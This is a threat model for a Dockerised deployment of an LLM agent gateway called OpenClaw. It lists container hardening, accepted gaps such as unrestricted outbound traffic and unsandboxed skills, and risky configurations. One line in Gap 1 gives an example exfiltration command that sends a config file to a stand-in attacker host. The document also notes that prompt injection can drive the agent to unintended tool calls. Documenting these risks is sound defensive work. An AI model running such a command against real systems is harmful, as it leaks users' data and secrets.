# Threat Model

This document describes what the Phase 1 deployment protects against, what it does not protect against, and the known gaps that are accepted for Phase 1 and documented here so that users deploying this template understand the actual security posture.

---

## What This Deployment Protects Against

- **Internet access to Redis.** Redis is on the `internal` Docker network only. There is no network path from the internet or from Caddy to Redis. Redis also requires password authentication.

- **Root container compromise.** OpenClaw runs as UID 1000 with all Linux capabilities dropped, `no-new-privileges`, a read-only root filesystem, and a default seccomp profile. A container escape from a root process is a different and worse failure than a container escape from a dropped-capability non-root process.

- **Resource exhaustion.** Container memory is capped at 2 GiB. CPU is capped at 1.5 cores. PID limit is 256. The execution guardrail adds session-level limits on top of these (see `docs/execution-guardrails.md`).

- **Opportunistic SSH attacks.** UFW blocks all inbound except ports 22 and 443. SSH password authentication is disabled. Root SSH login is disabled. Fail2ban bans repeated failed auth attempts.

- **Secrets in version control.** `.env` is gitignored and never committed. All secrets are injected via environment variables at runtime.

- **Uncontrolled LLM loops.** The execution guardrail kills OpenClaw if any session exceeds tool call, LLM call, session time, or idle time limits. This prevents runaway token burn and tool abuse loops.

- **Persistent skill abuse across restarts.** Skills installed into the container image are immutable. Dynamic remote skill installation is disabled by default.

---

## What It Does NOT Protect Against

- **Outbound data exfiltration.** Phase 1 ships with unrestricted outbound egress. A compromised container can reach arbitrary external hosts. See Gap 1.

- **Malicious or compromised skills writing to `/data`.** The `/data` volume persists across container restarts. A skill that writes malicious files to `/data` survives a container restart. See Gap 2.

- **A malicious skill reading session data or credentials.** There is no sandbox between skills and the OpenClaw Gateway process. See Gap 3.

- **Isolating one bad session from other active sessions.** A limit violation kills the entire OpenClaw process, dropping all sessions. See Gap 4.

- **Container escape.** If a container escape vulnerability exists in the kernel or Docker runtime and is exploited, this deployment does not stop it. Container hardening (cap_drop, seccomp, no-new-privileges) raises the bar but is not a guarantee.

- **Prompt injection attacks.** A malicious prompt delivered via a messaging channel could cause OpenClaw to execute unintended tool calls. The execution guardrail limits the blast radius but does not prevent prompt injection.

- **LLM provider-side attacks.** This deployment has no control over what happens at the LLM API endpoint.

---

## Known Gaps

### Gap 1 — Outbound Egress Unrestricted (Phase 1)

Docker allows all outbound traffic by default. A compromised OpenClaw container can exfiltrate data to arbitrary hosts — for example: `curl evil.com/exfil?data=$(cat /data/config)`. Phase 1 ships with outbound unrestricted and documents this explicitly. A commented UFW outbound block is included in `scripts/provision.sh` for Phase 1.5 enablement. Uncommenting it restricts outbound to known API endpoints (Telegram, WhatsApp/Meta, Anthropic, OpenAI, NTP, DNS).

**Risk:** High if container is compromised. Low if container is not compromised (which is the expected operating condition).

**Mitigation in Phase 1.5:** Enable the commented egress allowlist in `provision.sh`.

### Gap 2 — /data Is the Attack Persistence Surface

The `/data` volume is the only writable surface in the container. If OpenClaw is compromised via a malicious skill, prompt injection, or tool abuse, an attacker can write arbitrary files to `/data`. These files persist across container restarts.

**Container compromise = /data compromise.**

This is accepted for Phase 1. Treat `/data` backups as potentially tainted if compromise is suspected. Rotate all secrets before restoring from a backup made after a suspected compromise. Monitor `/data` for unexpected files.

### Gap 3 — No Isolation Between Skills and Core Runtime

Skills execute inside the same container process as the Gateway. There is no sandbox boundary between a skill and OpenClaw internals. A malicious skill can read session data, read credentials from environment variables, and write arbitrary files to `/data`. Dynamic remote skill installs are disabled by default — do not enable them unless you have reviewed the skill source.

### Gap 4 — No Per-Session Abort

OpenClaw does not expose a session abort API. When the execution guardrail detects a limit violation, it sends `SIGTERM` to the OpenClaw process. This drops all active sessions — not just the offending one. Docker restarts the container automatically.

This is a known Phase 1 limitation. There is no way to abort only the violating session without an OpenClaw-level API for it. All users connected at the time of a guardrail kill will lose their active session.

---

## Threat Model Assumptions

We assume:

- The webhook endpoint will be scanned and probed by automated scanners within hours of going live.
- Replay attacks against the webhook endpoint will be attempted.
- The LLM may generate dangerous or unintended tool commands, especially with adversarial prompts.
- The VPS worker may be compromised at some point in its lifetime.
- Data exfiltration attempts will be attempted if the container is compromised.
- CPU abuse via infinite loops or recursive tool calls will be attempted.

---

## What We Do NOT Assume

- That users will behave well or send only well-formed input.
- That the LLM will always generate safe output.
- That the VPS will never be probed or targeted.

---

## Deployment Risks

The following configurations increase risk significantly. Do not do these:

- Running this stack on a personal workstation exposed to the internet without a VPS firewall.
- Exposing the service without TLS (Caddy handles this, but do not bypass it).
- Setting `REDIS_PASSWORD` to an empty string or a weak value.
- Mounting the Docker socket into any container.
- Installing third-party skills without reviewing their source code.
- Enabling dynamic remote skill installation.
- Storing cloud IAM credentials on the VPS or in the container environment.
